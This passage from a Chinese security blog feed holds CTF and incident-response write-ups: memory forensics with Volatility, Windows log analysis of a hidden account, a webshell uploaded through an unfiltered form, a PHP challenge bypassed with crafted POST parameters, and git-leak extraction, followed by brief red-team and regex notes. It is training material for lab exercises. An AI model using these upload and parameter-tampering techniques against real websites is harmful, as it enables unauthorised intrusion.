href="#【任务5】VOL-EASY" class="headerlink" title="【任务5】VOL_EASY"></a>【任务5】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客入侵的网站地址是多少（只需要<a href="http://xxxxx/%EF%BC%89%EF%BC%9F">http://xxxxx/）？</a></p></blockquote><p>用<code>yarascan</code>搜索shell.php字符串，找到IE浏览器的主进程文件（iexplore.exe）中有一个网址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 yarascan -Y "shell.php"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6884858958cb8da5c8e18e16.png"></p><h4 id="【任务6】VOL-EASY"><a href="#【任务6】VOL-EASY" class="headerlink" title="【任务6】VOL_EASY"></a>【任务6】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客入侵时，使用的系统用户名是什么？</p></blockquote><p>Windows用户账户信息存储在注册表的<code>SAM</code> hive中。使用<code>hivelist</code>和<code>printkey</code>插件提取</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem profile=Win7sP1x64 hivelist</span><br></pre></td></tr></tbody></table></figure><p>找到<code>\SystemRoot\System32\Config\SAM</code>的虚拟地址，提取用户列表</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f vol_easy.vmem --profile=Win7SP1x64 printkey -o 0xfffff8a0000a8010 -K "SAM\Domains\Account\Users\Names"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6884728258cb8da5c8e14f1f.png"></p><p>这题靠蒙，只有这两个用户，蒙一个以管理员身份进入</p><h4 id="【任务8】VOL-EASY"><a href="#【任务8】VOL-EASY" class="headerlink" title="【任务8】VOL_EASY"></a>【任务8】VOL_EASY</h4><blockquote><p>题目描述</p><p>黑客首次操作靶机的关键程序是什么？</p></blockquote><p>黑客可以通过 Mimikatz、Procdump 等工具转储 <code>lsass.exe</code> 内存，提取明文密码、NTLM 哈希、Kerberos 票证，这里使用<code>pstree</code>来查看进程树</p><p><img src="https://pic1.imgdb.cn/item/6884743d58cb8da5c8e15310.png"></p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><h4 id="应急大师"><a href="#应急大师" class="headerlink" title="应急大师"></a>应急大师</h4><h4 id="【任务1】应急大师"><a href="#【任务1】应急大师" class="headerlink" title="【任务1】应急大师"></a>【任务1】应急大师</h4><blockquote><p>题目描述</p><p>请提交隐藏用户的名称？</p></blockquote><p>打开机子就能看见隐藏账户，或者可以去事件查看器查找事件ID为4720（账户创建）的事件，里面会有隐藏用户名称</p><img src="https://pic1.imgdb.cn/item/688477c958cb8da5c8e15da1.png" style="zoom:50%;"><h4 id="【任务2】应急大师"><a href="#【任务2】应急大师" class="headerlink" title="【任务2】应急大师"></a>【任务2】应急大师</h4><blockquote><p>题目描述</p><p>请提交黑客的IP地址？</p></blockquote><p>打开事件查看器，应用程序和服务日志–Microsoft-Windows–TerminalServices-RemoteConnectionManager–Operational中找到事件ID为1149的事件，其中就包含了远程连接的IP也就是黑客的IP</p><img src="https://pic1.imgdb.cn/item/6884788b58cb8da5c8e15fd8.png" style="zoom: 50%;"><h4 id="【任务3】应急大师"><a href="#【任务3】应急大师" class="headerlink" title="【任务3】应急大师"></a>【任务3】应急大师</h4><blockquote><p>题目描述</p><p>请提交黑客的一句话木马密码？</p></blockquote><p>一句话木马很可能从web上传，桌面刚好有个phpstudy，查看apache的目录，</p><img src="https://pic1.imgdb.cn/item/688479da58cb8da5c8e16390.png" style="zoom:50%;"><p>在uploads目录下看到可以php文件，进行查看</p><img src="https://pic1.imgdb.cn/item/68847a6f58cb8da5c8e1656c.png" style="zoom: 67%;"><h4 id="【任务4】应急大师"><a href="#【任务4】应急大师" class="headerlink" title="【任务4】应急大师"></a>【任务4】应急大师</h4><blockquote><p>题目描述</p><p>请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？</p></blockquote><p>使用命令<code>wmic useraccount get name,sid</code>查看sid</p><img src="https://pic1.imgdb.cn/item/68847bde58cb8da5c8e1699f.png" style="zoom:67%;"><h4 id="【任务5】应急大师"><a href="#【任务5】应急大师" class="headerlink" title="【任务5】应急大师"></a>【任务5】应急大师</h4><blockquote><p>题目描述</p><p>请提交黑客创建隐藏账户的事件（格式为 年/月/日 时:分:秒）？</p></blockquote><p>这个就必须去看事件查看器了</p><img src="https://pic1.imgdb.cn/item/68847c8158cb8da5c8e16c22.png" style="zoom: 50%;"><h4 id="【任务6】应急大师"><a href="#【任务6】应急大师" class="headerlink" title="【任务6】应急大师"></a>【任务6】应急大师</h4><blockquote><p>题目描述</p><p>黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher</p></blockquote><p>打开用户组，看到隐藏账户被加入到这两个组里面，至于先后顺序，肯定是先Users再到Administrators</p><img src="https://pic1.imgdb.cn/item/68847ceb58cb8da5c8e16dac.png" style="zoom:50%;"><h4 id="【任务7】应急大师"><a href="#【任务7】应急大师" class="headerlink" title="【任务7】应急大师"></a>【任务7】应急大师</h4><blockquote><p>题目描述</p><p>黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 IP:PORT 如 127.0.0.1:41110</p></blockquote><p>首先，明确还是在事件查看器中查看安全日志，筛选出事件ID为4624（登陆成功），根据任务5的隐藏账户时间，大概确认登陆时间在7/23 17：00附近，注意查看找到IP和端口</p><img src="https://pic1.imgdb.cn/item/6884978a58cb8da5c8e1ce6b.png" style="zoom: 50%;"><h4 id="公交车系统攻击事件排查"><a href="#公交车系统攻击事件排查" class="headerlink" title="公交车系统攻击事件排查"></a>公交车系统攻击事件排查</h4><p>首先，拿到网页在失物招领页面发现一个没有过滤的文件上传，上传木马，查看文件上传路径/uploads，哥斯拉连接。</p><img src="https://pic1.imgdb.cn/item/68847de458cb8da5c8e17179.png" style="zoom:50%;"><p>连接之后</p><p><img src="https://pic1.imgdb.cn/item/68847e9758cb8da5c8e17466.png"></p><h4 id="【任务1】公交车系统攻击事件排查"><a href="#【任务1】公交车系统攻击事件排查" class="headerlink" title="【任务1】公交车系统攻击事件排查"></a>【任务1】公交车系统攻击事件排查</h4><blockquote><p>题目描述</p><p>分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag{zhangsan-wangli}</p></blockquote><p>分析access.log，黑客在跑sqlmap，根据查询语句判断他正在使用时间延时盲注来获取信息，定位到username这几行日志，借助ai，让他根据是否延迟，最终确定每个字符，拼接处username</p><img src="https://pic1.imgdb.cn/item/6884941e58cb8da5c8e1c3f7.png" style="zoom:50%;"><p>第一个用户：sunyue</p><img src="https://pic1.imgdb.cn/item/688494c858cb8da5c8e1c769.png" style="zoom:50%;"><p>第二个用户：chenhao</p><img src="https://pic1.imgdb.cn/item/688494e758cb8da5c8e1c7dd.png" style="zoom:50%;"><h4 id="【任务2】公交车系统攻击事件排查"><a href="#【任务2】公交车系统攻击事件排查" class="headerlink" title="【任务2】公交车系统攻击事件排查"></a>【任务2】公交车系统攻击事件排查</h4><blockquote><p>题目描述</p><p>黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag{xxx}</p></blockquote><p>访问home目录下的wangqing目录中存在ftp文件，并且存在私密文件</p><img src="https://pic1.imgdb.cn/item/68847ec958cb8da5c8e17539.png" style="zoom: 67%;"><img src="https://pic1.imgdb.cn/item/68847efd58cb8da5c8e17615.png"><h4 id="【任务3】公交车系统攻击事件排查"><a href="#【任务3】公交车系统攻击事件排查" class="headerlink" title="【任务3】公交车系统攻击事件排查"></a>【任务3】公交车系统攻击事件排查</h4><blockquote><p>题目描述</p><p>可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag{password}</p></blockquote><p>查看shell1.php中，找到木马密码</p><img src="https://pic1.imgdb.cn/item/68847f5658cb8da5c8e17785.png" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024</title>
      <link href="/2025/07/23/basectf2024/"/>
      <url>/2025/07/23/basectf2024/</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF2024"><a href="#BaseCTF2024" class="headerlink" title="BaseCTF2024"></a>BaseCTF2024</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'len'</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) {</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">'tip'</span>]);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"错了！就你还想玩原神？❌❌❌"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">"我要玩原神"</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"我不管，我要玩原神！😭😭😭"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) != <span class="number">2</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"可恶的QQ人！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">"100%"</span> || <span class="variable">$b</span> != <span class="string">"love100%"</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) {</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure><p>首先第一部分</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (sizeof($_POST['len']) == sizeof($array)) {</span><br><span class="line">  ys_open($_GET['tip']);</span><br><span class="line">} else {</span><br><span class="line">  die("错了！就你还想玩原神？❌❌❌");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>需要POST传参len，并且长度需要是array数组的长度，所以这里决定向服务器传递一组连续的参数值，以<code>len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;...</code>的结构向len数组传入值，使数组中的值数量增加，从而爆破array数组的长度，这里使用一个python脚本，来写一个密码本</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./1.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        s = s + <span class="string">"len["</span> + <span class="built_in">str</span>(i) + <span class="string">"]=1&amp;"</span></span><br><span class="line">        file.write(s[:-<span class="number">1</span>] + <span class="string">"\n"</span>)</span><br></pre></td></tr></tbody></table></figure><p>得到的密码本像这样</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">len[1]=1</span><br><span class="line">len[1]=1&amp;len[2]=1</span><br><span class="line">len[1]=1&amp;len[2]=1&amp;len[3]=1</span><br><span class="line">len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1</span><br><span class="line">len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1</span><br><span class="line">len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1</span><br><span class="line">len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1&amp;len[7]=1</span><br><span class="line">…………</span><br></pre></td></tr></tbody></table></figure><p>然后使用burpsuite抓包，在POST参数处用上面的密码本进行爆破，为了验证是否通过，还需要在GET参数处传入<code>tip = 我要玩原神</code>，进行爆破。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">"我要玩原神"</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"我不管，我要玩原神！😭😭😭"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>爆破得到的数据包都是一样的长度，所以需要逐一查看，看数据响应包中回显<code>我不管，我要玩原神</code>，则证明已经进入ys_open函数，这里爆破出来，len为45，也就是<code>len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;...&amp;len[45]=1</code>。</p><p>第二部分</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) != <span class="number">2</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"可恶的QQ人！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">"100%"</span> || <span class="variable">$b</span> != <span class="string">"love100%"</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) {</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure><p><code>['m'][0]</code>这里以这样的形式赋值，证明m是一个数组。题目有判断m是否存在以及长度是否为2。</p><p>这里使用||（或运算）意味着需要都不满足才能不die，有一个满足就会die，a传入<code>100%</code>，b传入<code>love100%</code>再拼接一个a的md5值，但是需要注意这里的%需要先进行URL编码，不然会被浏览器解析不能绕过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m[0]=100%25&amp;m[1]=love%255e2d121ec0059bcf0ebb8e6ecc0fb3c1</span><br></pre></td></tr></tbody></table></figure><p>第三部分</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$flag[] = array();</span><br><span class="line"> for ($ii = 0;$ii &lt; sizeof($array);$ii++) {</span><br><span class="line">   $flag[$ii] = md5(ord($array[$ii]) ^ $ii);</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>输入m数组值后，返回一连串的md5的列表值，如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584",……]</span><br></pre></td></tr></tbody></table></figure><p>这些数组是第三部分中，对flag数组的加密逻辑之后的结果</p><p> <strong>加密逻辑分解</strong></p><ul><li><strong><code>ord($array[$ii])</code></strong><br>  获取数组 <code>$array</code> 中第 <code>$ii</code> 个字符的 <strong>ASCII 码值</strong>（如字符 <code>'A'</code> → <code>65</code>）。</li><li><strong><code>^ $ii</code></strong><br>  对 ASCII 码进行 <strong>按位异或（XOR）</strong> 操作，异或的密钥是当前索引 <code>$ii</code>。</li><li><strong><code>md5(...)</code></strong><br>  将 XOR 结果转换为 <strong>32 位 MD5 哈希值</strong>。</li></ul><p>这里写一个解密的脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_md5_hashes</span>(<span class="params">flags</span>):</span><br><span class="line">    array=[]</span><br><span class="line">    <span class="keyword">for</span> ii,flag <span class="keyword">in</span> <span class="built_in">enumerate</span>(flags):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()==flag:</span><br><span class="line">                array.append(<span class="built_in">chr</span>(i^ii))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(array)</span><br><span class="line">flags=[<span class="string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span>,<span class="string">"26657d5ff9020d2abefe558796b99584"</span>,…………<span class="string">"]</span></span><br><span class="line"><span class="string">original_array=reverse_md5_hashes(flags)</span></span><br><span class="line"><span class="string">print(original_array)</span></span><br></pre></td></tr></tbody></table></figure><ul><li>对每个哈希值，暴力破解 <code>0-255</code> 的数字，找到MD5匹配的数字 <code>i</code>。</li><li>用 <code>i ^ 当前索引 ii</code> 逆向计算原始字符的ASCII码</li></ul><p>最终就可以直接输出flag</p><hr><blockquote><p>其中核心的代码如下：</p></blockquote><blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if hashlib.md5(str(i).encode()).hexdigest() == flag:</span><br></pre></td></tr></tbody></table></figure><ol><li><strong><code>str(i)</code></strong><ul><li>将数字 <code>i</code> 转换为字符串（如 <code>65</code> → <code>"65"</code>）。</li><li><em>为什么？</em> MD5 算法需要字节输入，而非直接的数字。</li></ul></li><li><strong><code>.encode()</code></strong><ul><li>将字符串编码为字节（默认 UTF-8）。</li><li>例如：<code>"65"</code> → <code>b'65'</code>（字节形式）。</li></ul></li><li><strong><code>hashlib.md5()</code></strong><ul><li>调用 Python 的 MD5 哈希算法，生成哈希对象。</li><li>输入：字节流（如 <code>b'65'</code>）。</li></ul></li><li><strong><code>.hexdigest()</code></strong><ul><li>将 MD5 哈希结果转换为 <strong>32 位十六进制字符串</strong>。</li><li>例如：<code>b'65'</code> 的 MD5 → <code>"7fc56270e7a70fa81a5935b72eacbe29"</code>。</li></ul></li><li><strong><code>== flag</code></strong><ul><li>比较生成的哈希值与目标 <code>flag</code> 是否一致。</li></ul></li></ol><p><strong>完整执行流程示例</strong></p><p>假设 <code>i = 65</code>，<code>flag = "7fc56270e7a70fa81a5935b72eacbe29"</code>：</p><ol><li><code>str(65)</code> → <code>"65"</code></li><li><code>"65".encode()</code> → <code>b'65'</code></li><li><code>hashlib.md5(b'65')</code> → 哈希对象</li><li><code>.hexdigest()</code> → <code>"7fc56270e7a70fa81a5935b72eacbe29"</code></li><li>比较 <code>"7fc56270..." == "7fc56270..."</code> → <code>True</code></li></ol></blockquote><hr><blockquote><p> 其中<code>enumerate()</code> 是 Python 的一个内置函数，用于在遍历序列（如列表、元组、字符串）时，<strong>同时获取元素的索引和值</strong>。它将一个可迭代对象转换为一个“枚举对象”，生成 <code>(索引, 值)</code> 的组合。</p><p> <strong>基本语法</strong></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(iterable, start=<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><ul><li>**<code>iterable</code>**：要遍历的可迭代对象（如列表、字符串）。</li><li>**<code>start</code>**（可选）：索引的起始值（默认为 0）。</li></ul><p> <strong>核心功能</strong></p><p>假设有一个列表 <code>fruits = ['apple', 'banana', 'cherry']</code>：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(fruits):</span><br><span class="line">    <span class="built_in">print</span>(index, value)</span><br></pre></td></tr></tbody></table></figure><p><strong>输出</strong>：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> apple</span><br><span class="line"><span class="number">1</span> banana</span><br><span class="line"><span class="number">2</span> cherry</span><br></pre></td></tr></tbody></table></figure></blockquote><hr><h4 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h4><p>拿到页面，第一反应是进行目录扫描，然后就扫出了很多文件，那么应该就不是这种方式，但是发现存在很多git目录下的文件</p><p><img src="https://pic1.imgdb.cn/item/6880c5b158cb8da5c8d0d542.png"></p><p>那么这题可能考察的git泄露，使用工具githacker</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://gz.imxbt.cn:20602/.git/ --output-folder ctf</span><br></pre></td></tr></tbody></table></figure><p>cmd打开生成的随机数的文件夹使用<code>git log</code>查看</p><p><img src="https://pic1.imgdb.cn/item/6880c9ab58cb8da5c8d0eacd.png"></p><p>可以看到有<code>add what</code>和<code>remove flag</code></p><p>使用命令<code>git diff + 版本commit</code>，查看信息改动，获得flag</p><p><img src="https://pic1.imgdb.cn/item/6880c9f958cb8da5c8d0ec29.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红队攻防</title>
      <link href="/2025/07/22/hong-dui-gong-fang/"/>
      <url>/2025/07/22/hong-dui-gong-fang/</url>
      
        <content type="html"><![CDATA[<h1 id="红队攻防"><a href="#红队攻防" class="headerlink" title="红队攻防"></a>红队攻防</h1><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><h3 id="基本的红队测试流程介绍"><a href="#基本的红队测试流程介绍" class="headerlink" title="基本的红队测试流程介绍"></a>基本的红队测试流程介绍</h3><ol><li><p>接到项目合同并制定相应计划</p></li><li><p>准备相应的工具和材料</p></li><li><p>做第⼀次信息收集</p></li><li><p>做漏洞扫描或攻击面测试</p></li><li><p>针对突出的攻击面做具体的渗透</p></li><li><p>进⼊环境之后的第二次信息收集</p></li><li><p>提升权限</p></li><li><p>维持权限</p></li><li><p>寻找扩大攻击面的渠道</p></li><li><p>清理攻击痕迹</p></li><li><p>编写报告</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2025/07/18/zheng-ze-biao-da-shi/"/>
      <url>/2025/07/18/zheng-ze-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="限定符（匹配1个字符）"><a href="#限定符（匹配1个字符）" class="headerlink" title="限定符（匹配1个字符）"></a>限定符（匹配1个字符）</h2><table><thead><tr><th align="center">指令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">a?</td><td align="center">a出现0次或1次</td></tr><tr><td align="center">a*</td><td align="center">a出现0次或多次</td></tr><tr><td align="center">a+</td><td align="center">a出现1次以上</td></tr><tr><td align="center">a{6}</td><td align="center">a出现6次</td></tr><tr><td align="center">a{2,6}</td><td align="center">a出现2-6次</td></tr><tr><td align="center">a{2,}</td><td align="center">a出现两次以上</td></tr></tbody></table><ul><li>匹配多个字符<ul><li>(ab)+</li></ul></li></ul><h2 id="或运算符"><a href="#或运算符" class="headerlink" title="或运算符"></a>或运算符</h2><table><thead><tr><th align="center">指令</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">(a|b)</td><td align="center">匹配a或者b</td></tr><tr><td align="center">(ab)|(cd)</td><td align="center">匹配ab或者cd</td></tr></tbody></table><h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><table><thead><tr><th 